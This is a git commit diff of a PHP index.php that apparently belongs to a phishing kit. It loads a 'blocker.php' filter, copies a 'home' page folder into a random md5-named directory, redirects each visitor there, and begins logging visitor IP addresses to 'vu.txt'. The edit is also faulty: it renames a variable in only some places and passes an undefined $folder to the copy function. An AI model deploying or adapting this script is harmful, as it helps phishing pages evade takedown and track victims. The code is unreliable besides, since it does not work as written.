61e69b0071131ba24618500e4106083f1e25fac5
bobstottts <bobstottts@googlemail.com>
2017-07-21 18:14:35 +0600

    Update index.php

--- index.php
+++ index.php
@@ -2,8 +2,8 @@
 
 include('blocker.php');
 $DIR=md5(rand(0,100000000000));
-function recurse_copy($home,$DIR) {
-$dir = opendir($home);
+function recurse_copy($folder,$DIR) {
+$dir = opendir($folder);
 @mkdir($DIR);
 while(false !== ( $file = readdir($dir)) ) {
 if (( $file != '.' ) && ( $file != '..' )) {
@@ -11,14 +11,14 @@ if ( is_dir($home . '/' . $file) ) {
 recurse_copy($home . '/' . $file,$DIR . '/' . $file);
 }
 else {
-copy($home . '/' . $file,$DIR . '/' . $file);
+copy($folder . '/' . $file,$DIR . '/' . $file);
 }
 }
 }
 closedir($dir);
 }
 $home="home";
-recurse_copy( $home, $DIR );
+recurse_copy( $folder, $DIR );
 header("location:$DIR");
 $ip = getenv("REMOTE_ADDR");
 $file = fopen("vu.txt","a");
